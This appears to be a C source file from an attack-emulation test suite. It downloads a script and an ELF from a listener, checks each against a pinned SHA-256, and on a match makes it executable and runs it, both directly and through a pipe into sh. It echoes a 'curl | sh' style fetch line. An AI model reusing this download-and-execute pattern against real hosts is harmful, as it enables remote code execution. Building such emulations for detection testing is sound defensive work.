// SPDX-License-Identifier: GPL-3.0-only
// Copyright (c) 2026 MikiMiku (MoreMorePwn)
//
// stage.c — download-and-execute, with the download pinned.
//
// download fetches a script and download-elf a tiny ELF from the listener (the
// sinkhole serves fixed bytes). Both are written to the work directory and
// compared with a SHA-256 compiled into the sample. Only an exact match is
// made executable and run; any other response is left unexecuted. That is
// what keeps a --host that is not the sinkhole from running anything foreign.
#include "samples.h"

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#define PAYLOAD_MAX 8192

// One line of captured output: newlines become " / ".
static void flatten(char *text)
{
    size_t length = strlen(text);
    while (length > 0 && text[length - 1] == '\n')
        text[--length] = '\0';
    for (char *at = text; *at; at++)
        if (*at == '\n' || *at == '\r')
            *at = '|';
}

// Fetches `url_path`, saves it as `relative` below the work directory and
// reports whether it equals the pinned hash. Returns 1 for a verified file,
// 0 for a file that was saved but does not match, -1 for no download.
static int download(const struct options *options, const char *name, const char *url_path,
                    const char *pinned, const char *relative, char *saved, size_t saved_cap,
                    size_t *size)
{
    const char *host = sample_host(options);
    int port = sample_port(options, SAMPLE_HTTP_PORT);
    unsigned char body[PAYLOAD_MAX];
    int status = 0;
    ssize_t length = sample_http_fetch(host, port, url_path, body, sizeof body, &status);
    if (length < 0) {
        if (status)
            sample_note(name, "GET %s on %s:%d returned HTTP %d; nothing saved", url_path, host, port,
                     status);
        else
            sample_note(name, "%s:%d unreachable: %s", host, port, strerror(errno));
        return -1;
    }
    char directory[600];
    if (sample_path(directory, sizeof directory, options->workdir, ".cache") != 0 ||
        sample_mkdir_p(directory) != 0 || sample_path(saved, saved_cap, directory, relative) != 0 ||
        sample_write_bytes(saved, body, (size_t)length, 0600) != 0) {
        sample_fail(name, "could not save %s: %s", url_path, strerror(errno));
        return -1;
    }
    *size = (size_t)length;
    char digest[65];
    sample_sha256_hex(body, (size_t)length, digest);
    if (strcmp(digest, pinned) != 0) {
        sample_note(name, "hash mismatch, not executed: %zd bytes from %s:%d have sha256 %.16s..., "
                       "pinned %.16s...", length, host, port, digest, pinned);
        return 0;
    }
    sample_note(name, "sha256 %.16s... matches the pinned payload (%zd bytes)", digest, length);
    return 1;
}

SCENARIO(download)
{
    const char *name = "download";
    char saved[700];
    size_t size = 0;
    const char *host = sample_host(options);
    int port = sample_port(options, SAMPLE_HTTP_PORT);
    int verdict = download(options, name, SAMPLE_DOWNLOAD_PATH, SAMPLE_DOWNLOAD_SHA256, "install.sh", saved,
                           sizeof saved, &size);
    if (verdict < 0) {
        sample_unavailable(name, "download-and-run steps skipped: nothing was fetched");
        sample_pass(name, "GET http://%s:%d%s attempted (no usable response)", host, port,
                 SAMPLE_DOWNLOAD_PATH);
        return 0;
    }
    if (verdict == 0) {
        sample_pass(name, "GET http://%s:%d%s saved %zu bytes; hash mismatch, nothing was run", host,
                 port, SAMPLE_DOWNLOAD_PATH, size);
        return 0;
    }

    // 1. write -> chmod -> execve of the file just written.
    int direct = -1;
    if (chmod(saved, 0755) != 0) {
        sample_fail(name, "chmod %s: %s", saved, strerror(errno));
        return 1;
    }
    char *const direct_argv[] = {saved, NULL};
    char said[256], piped_said[256];
    direct = sample_spawn_capture(saved, direct_argv, NULL, NULL, options->workdir, said, sizeof said);
    if (direct == 127 || direct == 126) {
        // A noexec mount or no #! support: run it through the interpreter instead.
        char *const shell_argv[] = {"sh", saved, NULL};
        direct = sample_spawn_capture("/bin/sh", shell_argv, NULL, NULL, options->workdir, said,
                                   sizeof said);
        sample_note(name, "direct execve was refused; ran it as /bin/sh FILE");
    }

    // 2. the same bytes through a pipe into a shell. The first line of the
    // command carries the fetch text of a "curl URL | sh" one-liner; the second
    // line is the real pipe: cat FILE | sh.
    char script[1400];
    snprintf(script, sizeof script,
             "echo 'fetched earlier with: curl -s http://%s:%d%s' >&2\ncat '%s' | sh", host, port,
             SAMPLE_DOWNLOAD_PATH, saved);
    char *const pipe_argv[] = {"sh", "-c", script, NULL};
    int piped = sample_spawn_capture("/bin/sh", pipe_argv, NULL, NULL, options->workdir, piped_said,
                                  sizeof piped_said);
    flatten(said);
    flatten(piped_said);
    sample_note(name, "payload said: \"%s\"; through the pipe: \"%s\"", said, piped_said);

    char marker[700];
    sample_path(marker, sizeof marker, options->workdir, "download-marker.txt");
    int marked = access(marker, F_OK) == 0;
    sample_pass(name, "verified %zu bytes, ran %s (exit %d) and through a pipe into sh (exit %d), "
                   "marker file %s",
             size, saved, direct, piped, marked ? "written" : "missing");
    return direct == 0 && piped == 0 ? 0 : 1;
}

SCENARIO(download_elf)
{
    const char *name = "download-elf";
    char saved[700];
    size_t size = 0;
    const char *host = sample_host(options);
    int port = sample_port(options, SAMPLE_HTTP_PORT);
    int verdict = download(options, name, SAMPLE_ELF_PATH, SAMPLE_ELF_SHA256, "payload.elf", saved,
                           sizeof saved, &size);
    int ran = -1;
    char said[256];
    if (verdict == 1) {
        if (chmod(saved, 0755) != 0) {
            sample_fail(name, "chmod %s: %s", saved, strerror(errno));
            return 1;
        }
        char *const argv[] = {saved, NULL};
        ran = sample_spawn_capture(saved, argv, NULL, NULL, options->workdir, said, sizeof said);
        flatten(said);
        sample_note(name, "payload said: \"%s\"", said);
    } else {
        sample_unavailable(name, "the ELF was %s: its write-chmod-run steps were skipped",
                        verdict == 0 ? "not the pinned payload" : "not fetched");
    }

    // A stand-in compiler: a copy of this binary named cc writes a.out (a copy
    // of the same binary) and the result is run. Nothing is compiled.
    char self[512], bin[600], cc[700], out[700];
    int compiled = -1;
    if (sample_self_path(self, sizeof self) == 0 &&
        sample_path(bin, sizeof bin, options->workdir, ".bin") == 0 && sample_mkdir_p(bin) == 0 &&
        sample_path(cc, sizeof cc, bin, "cc") == 0 && sample_path(out, sizeof out, bin, "a.out") == 0 &&
        sample_copy_file(self, cc, 0755, 8u << 20) == 0) {
        char target[760];
        snprintf(target, sizeof target, "SAMPLE_NOOP_OUT=%s", out);
        char *const env[] = {target, NULL};
        char *const cc_argv[] = {"cc", "-o", out, "stage.c", NULL};
        if (sample_spawn(cc, cc_argv, env, "compile", NULL) == 0 && access(out, X_OK) == 0) {
            char *const out_argv[] = {out, NULL};
            compiled = sample_spawn(out, out_argv, NULL, "exit", NULL);
        }
    }
    if (compiled != 0)
        sample_unavailable(name, "the stand-in compile-and-run did not complete (%d)", compiled);
    sample_pass(name, "GET http://%s:%d%s -> %s; ELF run %s; stand-in cc and a.out %s", host, port,
             SAMPLE_ELF_PATH, verdict == 1 ? "pinned hash matched" : verdict == 0 ? "hash mismatch" : "no download",
             ran == 0 ? "ok" : "not run", compiled == 0 ? "ok" : "not run");
    return 0;
}
